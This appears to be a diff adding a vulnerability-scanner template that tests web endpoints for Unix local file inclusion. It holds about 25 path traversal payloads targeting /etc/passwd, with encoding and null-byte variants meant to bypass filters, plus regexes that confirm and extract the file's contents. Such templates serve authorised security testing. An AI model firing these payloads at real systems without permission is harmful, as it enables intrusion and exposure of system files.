@@ -1,0 +1,92 @@
+id: lfi-unix
+name: Local File Inclusion - Unix Systems
+version: 1.0
+author: Phantom Team
+severity: high
+description: >
+  Detects path traversal and local file inclusion vulnerabilities on Unix/Linux
+  systems. Uses various encoding techniques including standard traversal,
+  URL encoding, double encoding, UTF-8 overlong encoding, and null byte
+  injection to bypass input filters and read /etc/passwd.
+
+info:
+  cwe-id: CWE-22
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+
+tags:
+  - lfi
+  - traversal
+  - file-inclusion
+  - unix
+
+references:
+  - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion
+
+requests:
+  - method: GET
+    path:
+      - "/page?file={{payload}}"
+      - "/download?path={{payload}}"
+      - "/read?doc={{payload}}"
+      - "/include?page={{payload}}"
+      - "/view?file={{payload}}"
+      - "/load?template={{payload}}"
+
+    attack: batteringram
+    payloads:
+      payload:
+        # Standard traversal
+        - "../etc/passwd"
+        - "../../etc/passwd"
+        - "../../../etc/passwd"
+        - "../../../../etc/passwd"
+        - "../../../../../etc/passwd"
+        - "../../../../../../etc/passwd"
+        - "../../../../../../../etc/passwd"
+        - "../../../../../../../../etc/passwd"
+        # Absolute path
+        - "/etc/passwd"
+        # URL encoded traversal
+        - "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
+        # Double URL encoded
+        - "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+        - "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd"
+        # Dot encoded
+        - "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+        - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+        # Double dot encoded
+        - "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd"
+        # UTF-8 overlong encoding
+        - "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af/etc/passwd"
+        - "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c/etc/passwd"
+        - "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd"
+        # Backslash variants
+        - "..\\..\\..\\..\\..\\..\\etc/passwd"
+        - "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5cetc/passwd"
+        # Mixed encoding
+        - "..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66..%%32%66etc/passwd"
+        # Null byte injection (legacy)
+        - "../../../../../../../../etc/passwd%00index.html"
+        - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00index.html"
+        # Dot-slash bypass
+        - ".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin/bash"
+          - "bin/sh"
+        condition: or
+
+    extractors:
+      - type: regex
+        name: passwd_content
+        regex:
+          - "(root:.*:0:0:[^:]*:[^:]*:[^\\n]+)"
+        group: 1
+
+stop-at-first-match: true
